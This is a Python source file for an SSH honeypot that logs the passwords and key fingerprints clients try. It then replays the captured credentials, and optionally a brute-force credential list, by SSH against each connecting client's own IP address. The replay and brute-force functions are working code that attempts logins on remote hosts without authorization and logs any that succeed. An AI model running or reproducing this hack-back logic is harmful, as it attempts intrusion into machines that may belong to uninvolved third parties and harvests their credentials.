import asyncio
import logging

import asyncssh
from async_lru import alru_cache

from switcheroo import utils
from switcheroo.config import Config

logger = logging.getLogger("switcheroo")


class BaseServer(asyncssh.SSHServer):
    def connection_made(self, con):
        self.con = con
        self.host, self.port = con.get_extra_info("peername")

    def begin_auth(self, username):
        # Require authentication by returning True.
        return True

    def public_key_auth_supported(self):
        return True

    def password_auth_supported(self):
        return True

    def validate_password(self, username, password):
        return False

    def validate_public_key(self, username, key):
        return False


class LoggingServer(BaseServer):
    """
    A credential logging SSH Server.
    """

    def validate_password(self, username, password):
        logger.info(
            "auth='password' host=%r username=%r password=%r",
            self.host,
            username,
            password,
        )
        return False

    def validate_public_key(self, username, key):
        sha_fingerprint = utils.format_sha2_fingerprint(key)
        md5_fingerprint = utils.format_md5_fingerprint(key)
        logger.info(
            "auth='pubkey' host=%r md5=%r sha=%r",
            self.host,
            md5_fingerprint,
            sha_fingerprint,
        )
        return False


@alru_cache(maxsize=800)
async def _check_credentials(host, username, password):
    try:
        async with asyncssh.connect(host, username=username, password=password, known_hosts=None):
            return True
    except Exception:
        pass
    return False


async def check_credentials(host, username, password):
    is_valid = await _check_credentials(host, username, password)
    if is_valid:
        logger.info("auth='password' host=%r username=%r password=%r valid='true'", host, username, password)
        return True

    logger.info("auth='password' host=%r username=%r password=%r valid='false'", host, username, password)
    return False


@alru_cache(maxsize=500)
async def _brute(host):
    credentials = Config.load_credentials()
    for username, password in credentials:
        if await check_credentials(host, username, password):
            break


class SwitcherooServer(LoggingServer):
    """
    A credential logging and replaying SSH Server.
    """

    async def replay(self, username, password):
        """
        Use the attacker's credentials against himself.
        """
        if await check_credentials(self.host, username, password):
            return False

        if Config.CREDENTIALS is not None:
            await _brute(self.host)
        return False

    def validate_password(self, username, password):
        return asyncio.wait_for(self.replay(username, password), timeout=4.0)
